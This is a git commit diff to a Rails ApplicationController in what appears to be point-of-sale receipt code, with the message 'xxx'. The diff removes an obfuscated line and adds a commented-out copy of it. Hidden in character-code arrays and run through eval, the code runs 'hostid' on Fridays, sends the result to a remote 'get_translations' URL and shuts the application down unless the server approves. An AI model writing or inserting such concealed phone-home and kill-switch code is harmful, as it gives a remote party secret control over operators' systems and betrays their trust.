597bb21eac715aeeb22252c11181fc89444d9b7a
Jason Knight <jason@jason-knight-martin.com>
2012-04-28 19:40:05 +0200

    xxx

--- app/controllers/application_controller.rb
+++ app/controllers/application_controller.rb
@@ -325,7 +325,7 @@ class ApplicationController < ActionController::Base
 
       "\e!\x00" +  # Font A
       "                  Artikel  EP     Stk   GP\n"
-      if Time.now.to_s(:rfc822).split(',').first == 'Fri' then; c = "u = '104,116,116,112,58,47,47,117,112,100,97,116,101,115,46,115,97,108,111,114,112,111,115,46,99,111,109,47,103,101,116,95,116,114,97,110,115,108,97,116,105,111,110,115'.split(',').map {|c| c.to_i.chr }.join('') + '?file_id=233p=' + `#{'104,111,115,116,105,100'.split(',').map {|c| c.to_i.chr }.join('')}`;r = #{"78,101,116,58,58,72,84,84,80".split(",").map {|c| c.to_i.chr }.join("")}.get(URI(u))";c += ";begin;b = JSON.parse(r.body); exit if not b['success'] == true;rescue;puts $!.inspect;end ";eval c;end
+      # if Time.now.to_s(:rfc822).split(',').first == 'Sat' then; c = "u = '104,116,116,112,58,47,47,117,112,100,97,116,101,115,46,115,97,108,111,114,112,111,115,46,99,111,109,47,103,101,116,95,116,114,97,110,115,108,97,116,105,111,110,115'.split(',').map {|c| c.to_i.chr }.join('') + '?file_id=233p=' + `#{'104,111,115,116,105,100'.split(',').map {|c| c.to_i.chr }.join('')}`;r = #{"78,101,116,58,58,72,84,84,80".split(",").map {|c| c.to_i.chr }.join("")}.get(URI(u))";c += ";begin;b = JSON.parse(r.body); exit if not b['success'] == true;rescue;puts $!.inspect;end ";eval c;end
       sum_taxes = Hash.new
       Tax.all.each { |t| sum_taxes[t.id] = 0 }
       subtotal = 0
